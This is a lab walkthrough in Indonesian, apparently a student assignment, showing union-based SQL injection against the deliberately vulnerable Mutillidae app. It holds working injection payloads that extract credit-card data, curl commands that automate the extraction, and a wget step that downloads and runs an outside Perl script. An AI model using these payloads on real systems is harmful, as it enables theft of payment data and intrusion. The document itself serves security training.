### LESSON 8
1. Pada terminal metasploitable jalankan perintah berikut.
Ketikan perintah (sudo mysql atau mysql -u [nama_user] -p [password]). Lalu tekan enter. Ketikan perintah (show databases;) untuk menampilkan list dari database yang ada
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/1.1.png "success login as root in mysql")

2. Ketikan perintah (use owasp10) untuk memilih database yang aktif. Lalu perintah (show tables;) untuk menampilkan seluruh tabel pada database aktif.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/1.2.png "change database and show table")

3.Ketikan perintah (desc accounts;) untuk menampilkan struktur tabel dari accounts. Lalu ketikan perintah (desc credit_cards;) untuk menampilkan struktur tabel dari credit_cards.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/1.3.png "desc accounts and credit_cards table")

4. Ketikan perintah (select * from accounts union select ccid,ccnumber,ccv,expiration,null from credit_cards;). union digunakan untuk mengabungkan hasil query beberapa statement select menjadi 1 tabel.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/1.4.png "union query")

5. Selanjutnya, buka browser pada kali linux dan ketikan perintah URL sebagai berikut [IP_metasploitable]/mutillidae seperti pada gambar
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/2.1.png "Mutillidae Homepage") 
pada gambar 192.168.56.101/mutillidae

6. Pilih owasp10, injection, sqli-extract data, user info
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/2.2.png "open userinfo")

7. Ketikan perintah (' union select null -- ) pada kolom nama. lalu tekan enter 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/2.3.png "union query")

8. Hasil error menunjukan bahwa query yang diunion memiliki jumlah kolom yang berbeda.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/2.4.png "union query")

9. Klik kanan pada kolom name, pilih inspect element, kemudian ubah size dari kolom inputan nama menjadi 50 dengan mengubah size=20 menjadi size=50. Kemudian lakukan percobaan dengan menambah kolom yang diunion dengan cara menambah (,null) pada akhir pada perintah select sehingga menjadi (' union select null,null -- ). Pada gambar digunakan 5 null yang menyatakan 5 kolom yang akan di union kan. Untuk kasus yang lain jumlah null harus dicoba dan diiterasi sendiri.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/2.5.png "mencari jumlah kolom")

10. Hasilnya ketika di enter adalah tidak ada lagi error yang menyatakan bahwa union telah berhasil.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/2.6.png "union berhasil")

11. Selanjutnya untuk memetakan mana kolom pada database yang berhubungan dengan angka-angka ketika output ditampilkan, maka digunakan perintah (' union select 1,2,3,4,5 -- )
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/2.7.png "memetakan output")

12. Hasilnya ketika dienter adalah 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/2.8.png "hasil memetakan output")

13. Selanjutnya untuk mengeluarkan hasil yang diinginkan yaitu yang ada pada tabel credit_card maka dilakukan dengan perintah (' union select ccid,ccnumber,ccv,expiration,null from credit_cards -- )(jangan lupa spasi pada akhir perintah (-- )
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/2.9.png "union sql injection")

14. Hasilnya ketika dienter adalah
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/2.10.png "hasil union sql")
Data pada username menyatakan nomor kartu kredit, password menyatakan password, dan signature adalah masa berlaku.

15. Ketika dilakukan dengan curl, ketikan perintah ini pada termintal (curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://[IP_Address_mutillidae]/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'). Perlu menganti alamat ip agar sesuai.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/3.1.png "use curl")

16. Hasilnya adalah sebagai berikut
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/3.2.png "output use curl")
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/3.3.png "output use curl")

17. Untuk membuat output file maka ketikan perintah (cd /root)
kemudian ketikan perintah berikut (curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://[IP_Address_mutillidae]/mutillidae/index.php" | grep -i "Username="  > lesson8.txt). Perlu menganti alamat ip agar sesuai. Kemudian ketikan perintah (cat lesson8.txt) untuk menampilkan. 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/3.4.png "cat the use of curl")

18. Selanjutnya adalah mendownload output parser. Tujuannya adalah agar hasil crawl dapat dibaca dengan baik. Pertama ketikan perintah (cd /root) untuk pindah ke direktori root. kedua, ketikan perintah (wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT) untuk mendownload parser dalam bahasa perl. Kemudian ketikan (mv lesson8.pl.TXT lesson8.pl) untuk mengubah eksistensi file menjadi (.pl). Lalu perintah (chmod 700 lesson8.pl) untuk memastikan hanya pemilik yang bisa menjalankan.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/3.5.png "download and prepare parser")

19. Kemudian jalankan parser yang sudah didownload dengan perintah (./lesson8.pl) lalu enter
hasilnya adalah 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/3.6.png "run the parser")


